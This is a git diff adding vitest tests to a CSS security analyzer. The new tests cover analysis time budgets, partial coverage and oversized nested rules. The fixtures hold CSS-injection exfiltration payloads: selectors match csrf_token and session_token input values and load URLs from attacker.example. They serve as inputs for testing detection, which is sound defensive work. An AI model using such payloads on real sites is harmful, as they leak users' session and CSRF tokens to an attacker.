@@ -1,4 +1,4 @@
-import { describe, expect, it } from "vitest";
+import { describe, expect, it, vi } from "vitest";
 import { analyzeStylesheet } from "../../../src/core/analyzer/analyzeStylesheet";
 import { parseAttributeSelectors } from "../../../src/core/analyzer/analyzeSelector";
 import { extractUrls } from "../../../src/core/css/normalizeUrl";
@@ -110,14 +110,59 @@ describe("core analyzer", () => {
     expect(analyze('@import url("https://attacker.example/import.css");').findings.length).toBeGreaterThan(0);
   });
 
+
+  it("reports partial coverage when the analysis time budget is exceeded", () => {
+    const now = vi.spyOn(Date, "now");
+    try {
+      now.mockReturnValueOnce(0).mockReturnValue(10_000);
+      const summary = analyzeStylesheet({
+        cssText: 'input[name="csrf_token"][value^="a"]{background:url(https://attacker.example/budget)}',
+        pageUrl,
+        sourceKind: "style_element",
+        sourceUrl: pageUrl,
+      });
+      expect(summary.state).toBe("analysis.skipped.performance_budget");
+      expect(summary.partialStylesheets).toBeGreaterThan(0);
+      expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.performance_budget"))).toBe(true);
+    } finally {
+      now.mockRestore();
+    }
+  });
+
+
+  it("reports partial coverage when source parsing reaches the analysis time budget", () => {
+    const now = vi.spyOn(Date, "now");
+    try {
+      now.mockReturnValueOnce(0).mockReturnValueOnce(0).mockReturnValue(10_000);
+      const hugeMalformedCss = `${" ".repeat(12_000)}@media screen { input[name="csrf_token"][value^="a"] { background:url(https://attacker.example/budget-parse) }`;
+      const summary = analyzeStylesheet({
+        cssText: hugeMalformedCss,
+        pageUrl,
+        sourceKind: "style_element",
+        sourceUrl: pageUrl,
+      });
+      expect(summary.state).toBe("analysis.skipped.performance_budget");
+      expect(summary.partialStylesheets).toBe(1);
+      expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.performance_budget"))).toBe(true);
+    } finally {
+      now.mockRestore();
+    }
+  });
+
   it("scans oversized stylesheets instead of reporting a too-large skip", () => {
-    const padding = Array.from({ length: 16_000 }, (_, index) => `.pad-${index}{margin:${index % 17}px}`).join("\n");
-    const summary = analyze(`${padding}\ninput[name="csrf_token"][value^="z"]{background-image:url("https://attacker.example/oversized-z")}`);
-    expect(summary.state).not.toBe("analysis.skipped.too_large");
-    expect(summary.partialStylesheets).toBe(0);
-    expect(summary.analyzedStylesheets).toBe(1);
-    expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.too_large"))).toBe(false);
-    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
+    const now = vi.spyOn(Date, "now");
+    try {
+      now.mockReturnValue(0);
+      const padding = Array.from({ length: 16_000 }, (_, index) => `.pad-${index}{margin:${index % 17}px}`).join("\n");
+      const summary = analyze(`${padding}\ninput[name="csrf_token"][value^="z"]{background-image:url("https://attacker.example/oversized-z")}`);
+      expect(summary.state).not.toBe("analysis.skipped.too_large");
+      expect(summary.partialStylesheets).toBe(0);
+      expect(summary.analyzedStylesheets).toBe(1);
+      expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.too_large"))).toBe(false);
+      expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
+    } finally {
+      now.mockRestore();
+    }
   });
 
   it("continues scanning after the report cap and retains stronger later findings", () => {
@@ -137,6 +182,23 @@ describe("core analyzer", () => {
   it("uses source scanning for oversized nested CSS rules", () => {
     const padding = Array.from({ length: 16_000 }, (_, index) => `.utility-${index}{display:block}`).join("\n");
     const summary = analyze(`${padding}\n.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-oversized")}}`);
+    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.substring_match"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
+  });
+
+  it("preserves security-relevant nested source rules when normal parsing reaches the analysis budget", () => {
+    let calls = 0;
+    const budgetExceededAfterStart = () => calls++ === 0 ? 0 : 10_000;
+    const padding = Array.from({ length: 16_000 }, (_, index) => `.utility-${index}{display:block}`).join("\n");
+    const summary = analyzeStylesheet({
+      cssText: `${padding}\n.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-budget")}}`,
+      pageUrl,
+      sourceKind: "style_element",
+      sourceUrl: pageUrl,
+      now: budgetExceededAfterStart,
+    });
+    expect(summary.state).toBe("analysis.skipped.performance_budget");
     expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.substring_match"))).toBe(true);
     expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
     expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
